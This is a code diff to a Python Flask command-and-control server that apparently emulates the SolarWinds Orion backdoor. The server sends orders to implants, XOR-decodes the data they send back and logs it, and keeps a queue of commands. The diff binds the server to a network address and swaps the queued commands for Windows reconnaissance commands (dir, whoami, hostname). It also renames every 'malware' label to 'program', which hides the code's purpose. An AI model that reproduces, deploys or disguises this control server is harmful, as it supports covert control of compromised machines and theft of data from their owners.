@@ -15,6 +15,9 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+HOST = '192.168.132.2'
+PORT = 8081 # 2222
+
 def check_identity_client(data): # this fonction is not realistic and must be change
     if data["EventType"] == "Orion" and data["EventName"] == "EventManager":
         return True
@@ -32,7 +35,7 @@ def rand_byte():
 
 def create_http_body(command=None, additional_data=""):
     """
-    creation of the http body in post request from the malware
+    creation of the http body in post request from the program
     """
 
     if command is None:
@@ -119,7 +122,7 @@ def create_http_body(command=None, additional_data=""):
         </assembly>
         """
 
-def get_data_from_malware(json):
+def get_data_from_program(json):
     """
     Data are in the in the 'Message' fields
     """
@@ -136,25 +139,25 @@ def get_data_from_malware(json):
 
     xor_received = "".join([chr(ord(cs) ^ xor_byte) for cs in string_received])
 
-    answer_malware_string = binascii.unhexlify(xor_received.encode("ISO-8859-1")).decode("ISO-8859-1")
+    answer_program_string = binascii.unhexlify(xor_received.encode("ISO-8859-1")).decode("ISO-8859-1")
 
-    #json_data_received = json_loads(answer_malware_string)
+    #json_data_received = json_loads(answer_program_string)
 
     date = str(datetime.now())
-    write_log(answer_malware_string)
+    write_log(answer_program_string)
 
     return 1
 
 
 def find_desired_order(file_path_command):
     """
-    This function creates the command file to be executed by the malware if it is not present.
+    This function creates the command file to be executed by the program if it is not present.
     If the file is already present, the function returns the first command that is not marked as completed
     """
 
     if file_path_command not in os.listdir():
         # creation of the csv of the desired order with random value
-        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["ls", "pwd", ""], "state":["waiting", "waiting", "waiting"]})
+        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["dir", "whoami", "hostname"], "state":["waiting", "waiting", "waiting"]})
         print(df)
         df.to_csv(file_path_command, index=False)
 
@@ -184,9 +187,9 @@ def send_instruction():
     if (content_type == 'application/json'):
         json_received = request.get_json()
         #print("json_received : ", json_received)
-        #if check_identity_client(json_received): # C2 know it communicates with the malware
+        #if check_identity_client(json_received): # C2 know it communicates with the program
         if json_received["steps"] != []:
-            get_data_from_malware(json_received)
+            get_data_from_program(json_received)
 
         order, additional_data = find_desired_order(file_path_command)
         print("order", order)
@@ -198,4 +201,4 @@ def send_instruction():
 
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=True, host = HOST, port = PORT)
